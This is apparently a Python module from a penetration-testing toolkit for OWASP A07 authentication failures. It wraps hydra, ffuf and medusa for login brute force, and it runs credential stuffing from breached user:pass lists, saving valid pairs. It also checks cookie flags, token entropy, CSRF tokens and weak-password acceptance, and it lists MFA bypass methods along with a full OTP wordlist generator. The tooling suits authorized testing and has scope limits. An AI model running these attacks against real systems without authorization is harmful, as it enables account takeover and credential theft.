"""
modules/auth_failures.py
tmrswrr - A07: Identification & Authentication Failures
Brute force, credential stuffing, session hijacking, weak password policy, MFA bypass
"""
import os
import shutil

import requests

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    info,
    print_banner,
    prompt,
    run_and_print,
    section,
    success,
    warn,
)
from utils.http import ScopeViolation, get_client, set_cookie_headers
from utils.tools import engagement_rps, tool_cmd

FORM_HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}


def _post_form(client, url: str, data: str):
    """POST a urlencoded body, returning None instead of raising."""
    try:
        return client.post(url, data=data, headers=FORM_HEADERS)
    except (requests.RequestException, ScopeViolation) as exc:
        warn(f"request failed: {exc}")
        return None



def _out(name: str) -> str:
    d = str(OUTPUT_DIR)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


def brute_force():
    section("BRUTE FORCE ATTACK")
    url = _target()
    print(f"""
  {NEON_CYN}[1]{RST} hydra (HTTP form)
  {NEON_CYN}[2]{RST} hydra (HTTP Basic Auth)
  {NEON_CYN}[3]{RST} ffuf (HTTP form fuzzing)
  {NEON_CYN}[4]{RST} medusa
  {NEON_GRN}[0]{RST} Back
""")
    c = prompt("Choice")

    if c in ("1", "3"):
        endpoint  = prompt("Login endpoint (e.g. /login)")
        user_param = prompt("Username parameter name (e.g. username)")
        pass_param = prompt("Password parameter name (e.g. password)")
        user      = prompt("Username to attack (e.g. admin)")
        wordlist  = prompt(f"Password wordlist [{'/usr/share/wordlists/rockyou.txt'}]") or "/usr/share/wordlists/rockyou.txt"
        fail_str  = prompt("Failure string (text in response when login fails, e.g. 'Invalid credentials')")

        if c == "1":
            if not shutil.which("hydra"):
                warn("hydra not found. Install: apt install hydra")
                return
            import urllib.parse
            parsed = urllib.parse.urlparse(url)
            host = parsed.hostname
            path = parsed.path + endpoint
            scheme = "https-form-post" if parsed.scheme == "https" else "http-form-post"
            run_and_print(
                tool_cmd("hydra", [
                    "-l", user, "-P", wordlist, host, scheme,
                    f"{path}:{user_param}=^USER^&{pass_param}=^PASS^:F={fail_str}",
                    "-t", str(max(1, min(8, int(engagement_rps()) or 1))), "-V",
                ], pace=False, proxy=False),
                timeout=600
            )

        elif c == "3":
            if not shutil.which("ffuf"):
                warn("ffuf not found. Install: apt install ffuf")
                return
            out = _out("brute_ffuf.txt")
            cookies = SESSION.get("cookies", "")
            cookie_argv = ["-H", "Cookie: " + cookies] if cookies else []
            run_and_print(
                tool_cmd("ffuf", [
                    "-u", f"{url.rstrip('/')}/{endpoint.lstrip('/')}", "-X", "POST",
                    "-d", f"{user_param}={user}&{pass_param}=FUZZ",
                    "-w", wordlist, "-fr", fail_str, *cookie_argv, "-o", out,
                ]),
                timeout=600
            )

    elif c == "2":
        if not shutil.which("hydra"):
            warn("hydra not found. Install: apt install hydra")
            return
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname
        user = prompt("Username")
        wordlist = prompt("Wordlist") or "/usr/share/wordlists/rockyou.txt"
        scheme = "https" if parsed.scheme == "https" else "http"
        run_and_print(
            tool_cmd("hydra", ["-l", user, "-P", wordlist, host,
                               f"{scheme}-get", "/", "-t",
                               str(max(1, min(8, int(engagement_rps()) or 1))), "-V"],
                     pace=False, proxy=False),
            timeout=300
        )

    elif c == "4":
        if not shutil.which("medusa"):
            warn("medusa not found. Install: apt install medusa")
            return
        host = prompt("Host")
        user = prompt("Username")
        wordlist = prompt("Wordlist") or "/usr/share/wordlists/rockyou.txt"
        run_and_print(
            tool_cmd("medusa", ["-h", host, "-u", user, "-P", wordlist, "-M", "http"],
                     pace=False, proxy=False),
            timeout=300)


def credential_stuffing():
    section("CREDENTIAL STUFFING")
    url = _target()

    info("Credential stuffing - testing breached user:password pairs")
    cred_file = prompt("Path to credentials file (user:pass format)")
    if not os.path.exists(cred_file):
        warn("File not found")
        return

    endpoint  = prompt("Login endpoint (e.g. /api/login)")
    user_param = prompt("Username parameter")
    pass_param = prompt("Password parameter")
    fail_str  = prompt("Failure text in response")
    if not fail_str:
        warn("A failure string is required - without it every response looks like a "
             "successful login and the whole list is reported as valid.")
        return
    login_url = url.rstrip("/") + "/" + endpoint.lstrip("/")
    client = get_client()

    with open(cred_file) as f:
        lines = [l.strip() for l in f if ":" in l.strip()]

    info(f"Testing {len(lines)} credential pairs...")
    found = []
    for line in lines[:500]:
        user, _, pwd = line.partition(":")
        import urllib.parse
        data = f"{user_param}={urllib.parse.quote(user)}&{pass_param}={urllib.parse.quote(pwd)}"
        resp = _post_form(client, login_url, data)
        if resp is None:
            continue
        if fail_str.lower() not in resp.text.lower():
            success(f"VALID CREDENTIALS: {user}:{pwd}")
            found.append(f"{user}:{pwd}")
            add_vuln("Credential Stuffing Success", "Critical", "A07:2021",
                     f"The login endpoint accepted {user}:{pwd[:4]}… - the response "
                     f"(HTTP {resp.status_code}) does not contain the failure string "
                     f"'{fail_str}'.",
                     login_url, evidence=resp.evidence,
                     confidence="Firm", cwe="CWE-307")

    if found:
        out_file = _out("valid_creds.txt")
        with open(out_file, "w") as f:
            f.write("\n".join(found))
        success(f"{len(found)} valid credentials saved → {out_file}")
    else:
        info("No valid credentials found in this batch")


def session_analysis():
    section("SESSION MANAGEMENT ANALYSIS")
    url = _target()

    print(f"""
  {NEON_CYN}[1]{RST} Cookie security flags check
  {NEON_CYN}[2]{RST} Session fixation test
  {NEON_CYN}[3]{RST} Session token entropy analysis
  {NEON_CYN}[4]{RST} CSRF token check
  {NEON_GRN}[0]{RST} Back
""")
    c = prompt("Choice")

    if c == "1":
        info("Checking cookie security attributes...")
        # GET, not HEAD: plenty of stacks issue their session cookie only on a
        # real request. And each cookie is judged on its own - checking the
        # whole response for "httponly" passes every cookie as soon as one of
        # them has the flag.
        client = get_client()
        resp = client.safe_get(url)
        if resp is None:
            warn("No response - cannot inspect cookies.")
            return
        cookies = set_cookie_headers(resp)
        if not cookies:
            info("The response sets no cookies.")
            return

        for raw in cookies:
            name = raw.split("=", 1)[0].strip()
            attrs = raw.lower()
            issues = []
            if "httponly" not in attrs:
                issues.append("HttpOnly")
            if "secure" not in attrs and url.lower().startswith("https"):
                issues.append("Secure")
            if "samesite" not in attrs:
                issues.append("SameSite")
            if not issues:
                success(f"{name}: HttpOnly, Secure and SameSite all set")
                continue
            warn(f"{name}: missing {', '.join(issues)}")
            # Only a cookie that actually carries a session is worth Medium.
            session_like = any(k in name.lower()
                               for k in ("sess", "auth", "token", "jwt", "sid"))
            add_vuln(f"Insecure Cookie Attributes: {name}",
                     "Medium" if session_like else "Low", "A07:2021",
                     f"Set-Cookie for `{name}` omits {', '.join(issues)}. "
                     + ("This cookie looks session-bearing, so a missing HttpOnly "
                        "exposes it to XSS and a missing SameSite exposes it to CSRF."
                        if session_like else
                        "The cookie does not look session-bearing; impact depends on "
                        "what it holds."),
                     url, evidence=resp.evidence,
                     confidence="Confirmed", cwe="CWE-1004")

    elif c == "2":
        info("Session fixation test:")
        print(f"""
  {NEON_CYN}Steps:{RST}
    1. Note your pre-login session ID from: curl -sI {url}
    2. Log in to the application
    3. Check if session ID changes after login:
       curl -sI -b "sessionid=BEFORE_LOGIN_ID" {url}/login (POST)
    4. If session ID stays the same → Session Fixation vulnerability!
""")

    elif c == "3":
        info("Session token entropy analysis:")
        client = get_client()
        tokens, last = [], None
        for _ in range(8):
            resp = client.safe_get(url)
            if resp is None:
                continue
            last = resp
            for raw in set_cookie_headers(resp):
                name, _, rest = raw.partition("=")
                if any(k in name.lower() for k in ("sess", "sid", "auth", "token")):
                    tokens.append(rest.split(";")[0].strip())

        if not tokens:
            info("No session-looking cookie was issued - nothing to analyse.")
            return

        print("\n  Sample tokens collected:")
        for t in tokens[:5]:
            print(f"  {NEON_GRN}{t[:80]}{RST}")

        unique = set(tokens)
        if len(unique) == 1 and len(tokens) > 1:
            warn("Every request returned the *same* token - it is not per-session.")
            add_vuln("Static Session Token", "High", "A07:2021",
                     f"All {len(tokens)} requests received the identical token value, "
                     "so it is not generated per session.",
                     url, evidence=getattr(last, "evidence", None),
                     confidence="Confirmed", cwe="CWE-330")
            return

        # Shannon entropy over the observed characters, bounded by token length.
        # The old formula multiplied length by log2(charset) of *all* tokens
        # concatenated, which reports 300+ bits for a 4-character counter.
        import collections
        import math
        sample = max(unique, key=len)
        counts = collections.Counter(sample)
        per_char = -sum((n / len(sample)) * math.log2(n / len(sample))
                        for n in counts.values())
        entropy = per_char * len(sample)
        info(f"Longest token: {len(sample)} chars, ~{entropy:.0f} bits of "
             "character-level entropy (>128 recommended)")
        info("Character-level entropy is an upper bound: a long token built from a "
             "counter or a timestamp scores well here and is still predictable.")
        if entropy < 64:
            add_vuln("Weak Session Token Entropy", "High", "A07:2021",
                     f"Session token is {len(sample)} characters over an alphabet of "
                     f"{len(counts)}, giving at most ~{entropy:.0f} bits - brute-forceable.",
                     url, evidence=getattr(last, "evidence", None),
                     confidence="Firm", cwe="CWE-331")

    elif c == "4":
        info("CSRF token check:")
        import re as _re
        client = get_client()
        resp = client.safe_get(url)
        if resp is None:
            warn("No response - cannot check for CSRF tokens.")
            return
        body = resp.text
        # Only state-changing forms need a token; reporting a GET-only page as
        # "missing CSRF protection" is noise.
        post_forms = _re.findall(r"<form[^>]*method\s*=\s*[\"\']?post[\"\']?[^>]*>(.*?)</form>",
                                 body, _re.S | _re.I)
        if not post_forms:
            info("No POST form on this page - nothing to protect here.")
            return

        token_pattern = _re.compile(r"name\s*=\s*[\"\']([^\"\']*(?:csrf|xsrf|_token|authenticity)[^\"\']*)",
                                    _re.I)
        unprotected = [f for f in post_forms if not token_pattern.search(f)]
        if not unprotected:
            success(f"All {len(post_forms)} POST form(s) carry a CSRF token")
        else:
            warn(f"{len(unprotected)} of {len(post_forms)} POST form(s) carry no CSRF token")
            add_vuln("Missing CSRF Protection", "High", "A07:2021",
                     f"{len(unprotected)} of {len(post_forms)} POST forms on this page "
                     "contain no hidden token field. Confirm the server actually "
                     "validates a token before reporting - a SameSite=Strict cookie "
                     "can be the real defence.",
                     url, evidence=resp.evidence,
                     confidence="Tentative", cwe="CWE-352")


def password_policy_check():
    section("PASSWORD POLICY ASSESSMENT")
    url = _target()

    print(f"""
  {NEON_CYN}Testing weak password acceptance:{RST}
  Attempting to register/change password with common weak passwords
""")
    endpoint = prompt("Registration or password change endpoint")
    user_param = prompt("Username/email parameter")
    pass_param = prompt("Password parameter")

    weak_passwords = ["123456", "password", "admin", "12345678", "abc123",
                      "qwerty", "letmein", "monkey", "1234567890", "password1"]

    import urllib.parse
    client = get_client()
    reg_url = url.rstrip("/") + "/" + endpoint.lstrip("/")

    # A password the policy must reject, to learn what rejection looks like here.
    control = _post_form(
        client, reg_url,
        f"{user_param}=yeepforge_ctl&{pass_param}=" + urllib.parse.quote("a"))
    if control is None:
        warn("Control request failed - cannot distinguish accepted from rejected.")
        return
    info(f"Rejection baseline (1-char password): HTTP {control.status_code}, "
         f"{len(control.text)} bytes")

    for pwd in weak_passwords:
        data = f"{user_param}=testuser_{pwd}&{pass_param}={urllib.parse.quote(pwd)}"
        resp = _post_form(client, reg_url, data)
        if resp is None:
            continue
        # Accepted means "handled differently from a password we know is refused",
        # not "the page happens to contain the word success".
        accepted = (resp.status_code != control.status_code
                    or abs(len(resp.text) - len(control.text)) > max(32, len(control.text) * 0.05))
        if accepted:
            warn(f"Weak password accepted: '{pwd}'")
            add_vuln("Weak Password Policy", "Medium", "A07:2021",
                     f"The password '{pwd}' was handled differently from a password the "
                     f"policy refuses (HTTP {resp.status_code} vs {control.status_code}, "
                     f"{len(resp.text)} vs {len(control.text)} bytes), so it appears to "
                     "have been accepted.",
                     reg_url, evidence=resp.evidence,
                     confidence="Tentative", cwe="CWE-521")
        else:
            print(f"  {DIM}[-] '{pwd}' rejected{RST}")


def mfa_bypass():
    section("MFA/2FA BYPASS TECHNIQUES")
    print(f"""
  {NEON_CYN}MFA Bypass Methods:{RST}

  {NEON_GRN}[1] OTP Brute Force:{RST}
    - 6-digit OTP = 1,000,000 combinations
    - Test rate limiting: can you try 1000 codes/sec?
    - ffuf -u URL/verify -X POST -d "code=FUZZ" -w /tmp/otps.txt

  {NEON_GRN}[2] OTP Code Reuse:{RST}
    - Use a valid OTP code twice → should be rejected
    - Some implementations accept already-used tokens

  {NEON_GRN}[3] Response Manipulation:{RST}
    - Intercept 2FA response in proxy
    - Change "success":false to "success":true
    - Change HTTP 401 to 200

  {NEON_GRN}[4] Skip MFA Endpoint:{RST}
    - After submitting username/password, directly access protected page
    - Try: cookies from step 1 + direct access to /dashboard

  {NEON_GRN}[5] Backup Codes / Recovery Flow:{RST}
    - Test backup codes for predictability
    - Test account recovery without MFA

  {NEON_GRN}[6] SIM Swapping / SS7 Attack:{RST}
    - Social engineering ISP to redirect SMS
    - Out of scope for most engagements
""")
    if prompt("Generate OTP wordlist for brute force? [y/N]").lower() == "y":
        wl = _out("otp_codes.txt")
        with open(wl, "w") as f:
            f.write("\n".join(f"{i:06d}" for i in range(1000000)))
        success(f"OTP wordlist (000000-999999) → {wl}")
        info(f"ffuf -u TARGET/verify -X POST -d 'code=FUZZ' -w {wl} -fr 'Invalid'")


def run():
    print_banner("AUTHENTICATION FAILURES", "A07:2021 - OWASP Top 10 #7")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Brute Force (hydra / ffuf)
  {NEON_CYN}[2]{RST} Credential Stuffing
  {NEON_CYN}[3]{RST} Session Management Analysis
  {NEON_CYN}[4]{RST} Password Policy Check
  {NEON_CYN}[5]{RST} MFA / 2FA Bypass Techniques
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            brute_force()
        elif c == "2":
            credential_stuffing()
        elif c == "3":
            session_analysis()
        elif c == "4":
            password_policy_check()
        elif c == "5":
            mfa_bypass()
        save_session()
